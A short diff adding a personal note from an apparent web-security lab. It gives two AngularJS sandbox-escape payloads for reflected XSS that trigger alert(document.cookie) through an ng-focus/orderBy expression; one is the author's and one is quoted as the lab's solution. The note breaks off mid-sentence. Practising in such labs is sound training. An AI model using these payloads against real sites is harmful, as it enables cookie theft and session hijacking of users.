@@ -1,0 +1,17 @@
+
+
+using the following does the reflected XSS when the input box is clicked on
+<script>
+location='https://0af6000d04a1491484d9860d008a0032.web-security-academy.net/?search=<input+id%3Dx+ng-focus%3D%24event.composedPath%28%29%7CorderBy%3A%27%28y%3Dalert%29%28document.cookie%29%27>'
+</script>
+
+
+
+the labs gives the solution of:
+<script>
+    location='https://0af6000d04a1491484d9860d008a0032.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+
+
+
+both works to solve the
